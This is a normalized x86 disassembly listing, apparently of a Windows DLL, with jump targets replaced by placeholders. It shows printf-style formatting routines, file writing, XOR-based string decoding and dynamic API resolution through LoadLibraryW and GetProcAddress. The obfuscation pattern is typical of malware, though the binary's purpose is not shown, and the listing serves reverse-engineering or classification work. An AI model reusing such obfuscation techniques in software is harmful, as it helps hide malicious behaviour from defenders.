mov [ ebp - 0x428 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x424 ]
push ecx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x42c ] 0x1
call sub_1007fb29
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x430 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x40c ] edi
test edi edi
jns r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ebx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0x40c ]
cmp ebx 0xffffffff
jne r-xdata
sub eax ebx
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi ebx
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x420 ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x10
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x444 ] edx
jmp r-xdata
sub eax ebx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x444 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x444 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x428 ] ebx
jmp r-xdata
cmp [ ebp - 0x43c ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea ebx [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x420 ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
test eax eax
je r-xdata
sub eax edx
je r-xdata
or [ ebp - 0x408 ] 0x20
add ecx 0x20
mov [ ebp - 0x468 ] 0x1
mov [ ebp - 0x41c ] ecx
sub eax ebx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x43c ]
call sub_1001b2d2
and [ ebp - 0x43c ] 0x0
mov edi [ ebp - 0x430 ]
sub edi [ ebp - 0x414 ]
sub edi [ ebp - 0x428 ]
mov [ ebp - 0x41c ] edi
test al 0xc
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ebx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ebx
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
push [ ebp - 0x428 ]
mov edi [ ebp - 0x464 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_1007fb58
test [ ebp - 0x408 ] 0x8
pop ecx
pop ecx
je r-xdata
jmp r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x470 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x46c ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x468 ]
movsx eax [ ebp - 0x41c ]
push [ ebp - 0x40c ]
mov [ ebp - 0x420 ] edi
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x470 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x408 ]
add esp 0x1c
and edi 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x420 ] edi
call sub_1006a965
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x420 ] edi
mov [ ebp - 0x45c ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ebx
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_1001b8e5
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x42c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop ecx
mov [ ebp - 0x434 ] cx
mov [ ebp - 0x428 ] 0x1
cmp [ ebp - 0x40c ] 0xa3
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x41c ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x44c ] 0x0
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x41c ] 0x8
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x42c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_1004bc30
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x460 ] 0x0
add eax 0x2
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x414 ]
mov edi [ ebp - 0x464 ]
push [ ebp - 0x410 ]
mov ebx [ ebp - 0x424 ]
lea eax [ ebp - 0x418 ]
call sub_1007fb58
pop ecx
pop ecx
mov ebx [ ebp - 0x414 ]
test ebx ebx
jle r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_1007fb29
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
push 0x20
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_1005f1fb
pop ecx
mov [ ebp - 0x43c ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x418 ]
mov [ esi ] eax
mov ax [ ebp - 0x418 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x428 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x448 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
test edi edi
jg r-xdata
mov [ ebp - 0x40c ] 0xa3
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc ebx
mov [ ebp - 0x410 ] ebx
lea eax [ ebp - 0x458 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x448 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x41c ]
cdq
push edx
push eax
push edi
push ebx
call sub_10082370
add ecx 0x30
mov [ ebp - 0x474 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x41c ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x45c ]
mov eax [ ebp - 0x424 ]
lea esi [ ebp - 0x418 ]
call sub_1007fb29
add edi [ ebp - 0x474 ]
pop ecx
test ebx ebx
jg r-xdata
push 0x30
lea esi [ ebp - 0x418 ]
mov eax ebx
dec edi
call sub_1007fb29
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
call sub_1007fa40
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x444 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x45c ]
push edi
push eax
dec ebx
call sub_1004bc30
add esp 0x10
mov [ ebp - 0x474 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_1007fb29
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov eax [ ebp - 0x410 ]
inc [ ebp - 0x414 ]
mov [ eax ] 0x30
jmp r-xdata
mov eax esi
cmp [ eax ] 0x30
je r-xdata
sub_1002f1c8
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov ebp [ ebp - 0x4 ]
mov esp [ ebx - 0x4 ]
jmp eax
sub_1002f1fa
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_1002f240
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi ] 0x0
pop edi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_1002f270
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov edi [ rw-data ]
cmp edi [ rw-data ]
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
mov ebx [ eax + 0x10 ]
mov ecx [ eax + 0x14 ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] ecx
jmp r-xdata
mov ecx [ edi ]
add ecx 0xc
cmp [ ebp - 0x8 ] 0x8
jb r-xdata
mov esi [ ecx + 0x10 ]
mov edx esi
cmp edx esi
jae r-xdata
mov eax [ eax ]
mov edx esi
cmp esi ebx
jb r-xdata
cmp [ ecx + 0x14 ] 0x8
jb r-xdata
mov edx ebx
test edx edx
je r-xdata
mov ecx [ ecx ]
cmp esi ebx
jb r-xdata
mov bx [ ecx ]
cmp bx [ eax ]
jne r-xdata
add edi 0x4
cmp edi [ rw-data ]
jne r-xdata
xor eax eax
cmp esi ebx
setne al
sbb eax eax
and eax 0xfffffffe
inc eax
je r-xdata
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ edi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ebx [ ebp - 0x4 ]
mov ebx [ ebp - 0x4 ]
jmp r-xdata
test eax eax
je r-xdata
sub_1002f32c
mov edi edi
push esi
call sub_10030bed
mov esi eax
push esi
call sub_1005dd3f
push esi
call sub_1000b9af
push esi
call sub_100263e8
push esi
call sub_1002ffe4
push esi
call sub_1006d071
push esi
call sub_100699df
add esp 0x18
pop esi
retn
sub_1002f360
push ebp
mov ebp esp
push ecx
push esi
push edi
xor edi edi
push edi
push 0x80
push 0x2
push edi
push edi
push 0xc0000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push edi
lea ecx [ ebp - 0x4 ]
push ecx
push edx
push eax
push esi
mov [ ebp - 0x4 ] edi
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
lea eax [ edi + 0x1 ]
pop edi
pop esi
mov esp ebp
pop ebp
retn
push esi
call [ CloseHandle@IAT ]
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
mov edi 0x2
sub_1002f3c9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
lea esi [ eax * 8 + rw-data ]
cmp [ esi ] 0x0
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push eax
call sub_10002fb1
pop ecx
test eax eax
jne r-xdata
push 0x11
call sub_1004929a
sub_1002f3fc
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x1c ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
mov [ ebp - 0x28 ] eax
lea edi [ ebp - 0x24 ]
call sub_1006995b
test al al
jne r-xdata
push [ ebp - 0x28 ]
mov ecx esi
xor bl bl
call sub_1006995b
test al al
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x28 ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1001f91c
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebp - 0x24 ] 0x2b
jmp r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1001f91c
lea eax [ ebp - 0x2c ]
push eax
push 0xa
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x24 ]
xor ebx ebx
push eax
mov [ edi ] 0x0
mov [ ebp - 0x2c ] ebx
call sub_1000c882
add esp 0x10
push [ ebp - 0x28 ]
mov ecx esi
mov edi eax
call sub_1006995b
test al al
je r-xdata
lea edi [ ebp - 0x24 ]
test bl bl
je r-xdata
mov ecx esi
mov bl 0x1
call sub_1005f5ef
push [ ebp - 0x28 ]
mov ecx esi
call sub_1006995b
test al al
je r-xdata
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1001f91c
mov ecx esi
lea edi [ ebp - 0x23 ]
call sub_1005f5ef
cmp [ esi + 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x24 ]
cmp [ ebp - 0x30 ] eax
je r-xdata
inc ebx
mov [ edi ] 0x30
inc edi
jmp r-xdata
mov [ ebp - 0x24 ] 0x2d
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1001f91c
or ebx 0x2
cmp [ ebp - 0x2c ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp edi [ ebp + 0x14 ]
jl r-xdata
mov al [ esi + 0x5 ]
mov [ edi ] al
lea eax [ ebp - 0x5 ]
cmp edi eax
jae r-xdata
mov ecx esi
call sub_1001f91c
cmp [ ebp + 0x18 ] edi
jl r-xdata
mov ecx esi
mov bl 0x1
call sub_1005f5ef
inc edi
mov eax [ ebp - 0x34 ]
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
sub_1002f56c
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_10030594
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
push 0x0
push edi
mov ecx esi
call sub_100056ae
test al al
je r-xdata
pop edi
push [ ebp + 0xc ]
mov ecx esi
push ebx
push [ esi + 0x10 ]
call sub_100412aa
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_1002f5f6
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_1008394f
pop ebp
retn
sub_1002f620
lea ecx [ eax + eax * 2 ]
lea ecx [ ecx * 4 + r--data ]
xor eax eax
cmp [ ecx + 0x4 ] eax
jbe r-xdata
mov eax [ ecx + 0x4 ]
xor ecx ecx
mov [ edx + eax * 2 ] cx
retn
push esi
push edi
mov esi [ ecx ]
movsx esi [ esi + eax ]
movzx edi [ ecx + 0x8 ]
xor si di
xor si ax
mov edi 0xff
and si di
mov [ edx + eax * 2 ] si
inc eax
cmp eax [ ecx + 0x4 ]
jb r-xdata
pop edi
pop esi
sub_1002f670
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x1
jne r-xdata
call sub_1001cd80
test eax eax
jne r-xdata
call sub_1006ed60
test eax eax
jne r-xdata
mov ecx eax
call sub_10001620
test eax eax
je r-xdata
mov eax 0x1
pop ecx
pop ebp
retn
cmp [ ebp + 0x8 ] eax
je r-xdata
mov [ rw-data ] 0x1
mov eax 0x2
pop ecx
pop ebp
retn
xor eax eax
pop ecx
pop ebp
retn
sub_1002f6be
push 0x14
mov eax sub_10085df6
call sub_10026266
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_1000c927
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_1006ef60
mov ecx [ ebp + 0x8 ]
push eax
call sub_1005eec0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10003c9c
mov eax edi
call sub_10008d33
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_100427ea
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10042890
push edi
call sub_10008715
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_100661c2
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_10055e2a
sub_1002f780
push ebp
mov ebp esp
push 0xffffffff
push sub_100867b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x14 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov ecx [ esi ]
lea eax [ ebp - 0x58 ]
push eax
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x58 ] 0x0
call sub_10070310
mov [ ebp - 0x60 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x58 ]
push 0x4
push 0x0
mov [ ebp - 0x68 ] ecx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x62
call sub_1002f620
mov ecx [ ebp - 0x58 ]
test ecx ecx
je r-xdata
xor esi esi
mov [ eax ] 0x0
mov esi eax
jmp r-xdata
mov eax [ esi ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov eax [ ebp - 0x60 ]
mov [ esi ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn 0x4
mov edx [ ecx ]
mov eax [ edx ]
push 0x1
call eax
jmp r-xdata
mov ecx [ ebp - 0x58 ]
mov eax [ edi + 0x4 ]
dec [ eax ]
cmp [ eax ] 0x0
jne r-xdata
inc [ esi ]
mov [ ebp - 0x64 ] esi
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x0
cmp edi edx
je r-xdata
mov esi [ ebp - 0x5c ]
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x58 ]
mov [ edi ] ecx
mov [ edi + 0x4 ] esi
inc [ esi ]
jmp r-xdata
mov ecx [ edi ]
test ecx ecx
je r-xdata
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ ebp - 0x4 ] 0xffffffff
dec [ esi ]
jne r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1002f8e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10089c41
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov esi ecx
mov [ ebp - 0x2b4 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
xor ebx ebx
cmp [ esi + 0xc ] ebx
je r-xdata
lea edx [ ebp - 0x120 ]
mov eax 0x156
call sub_10069020
xor esi esi
xor ecx ecx
mov eax edx
mov [ ebp - 0x280 ] 0x7
mov [ ebp - 0x284 ] esi
mov [ ebp - 0x294 ] cx
lea edx [ eax + 0x2 ]
jmp r-xdata
cmp [ esi + 0x384 ] ebx
jne r-xdata
lea edx [ ebp - 0x110 ]
mov eax 0xbb
call sub_10069020
xor ecx ecx
mov eax edx
mov [ ebp - 0x280 ] 0x7
mov [ ebp - 0x284 ] ebx
mov [ ebp - 0x294 ] cx
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
push 0x104
mov eax 0x1
lea ecx [ ebp - 0x278 ]
push ebx
push ecx
mov [ esi + 0x3c ] ebx
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] eax
mov [ esi + 0x40 ] eax
call sub_1007f8f0
add esp 0xc
lea edx [ ebp - 0x278 ]
push edx
push 0x104
call [ GetCurrentDirectoryA@IAT ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x2b4 ]
push eax
push ecx
lea edx [ ebp - 0x278 ]
push edx
lea edi [ esi + 0x50 ]
push esi
mov ebx edi
call sub_10060080
test eax eax
je r-xdata
lea edx [ ebp - 0x6c ]
mov eax 0x105
call sub_10069020
lea edi [ ebp - 0x1c ]
mov eax 0xf7
call sub_1000ce20
lea edi [ ebp - 0x28 ]
mov eax 0x59
call sub_1000ce20
lea edi [ ebp - 0x44 ]
mov eax 0xf9
call sub_1000ce20
lea edi [ ebp - 0x54 ]
mov eax 0xb2
call sub_1000ce20
lea edi [ ebp - 0x34 ]
mov eax 0xac
call sub_1000ce20
lea ecx [ ebp - 0x6c ]
push ecx
call [ LoadLibraryW@IAT ]
mov edi [ GetProcAddress@IAT ]
lea edx [ ebp - 0x1c ]
push edx
push eax
mov [ esi + 0x384 ] eax
call edi
mov ecx [ esi + 0x384 ]
mov [ esi + 0x388 ] eax
lea eax [ ebp - 0x28 ]
push eax
push ecx
call edi
lea edx [ ebp - 0x44 ]
mov [ esi + 0x38c ] eax
mov eax [ esi + 0x384 ]
push edx
push eax
call edi
mov edx [ esi + 0x384 ]
lea ecx [ ebp - 0x54 ]
push ecx
push edx
mov [ esi + 0x390 ] eax
call edi
mov ecx [ esi + 0x384 ]
mov [ esi + 0x394 ] eax
lea eax [ ebp - 0x34 ]
push eax
push ecx
call edi
mov [ esi + 0x398 ] eax
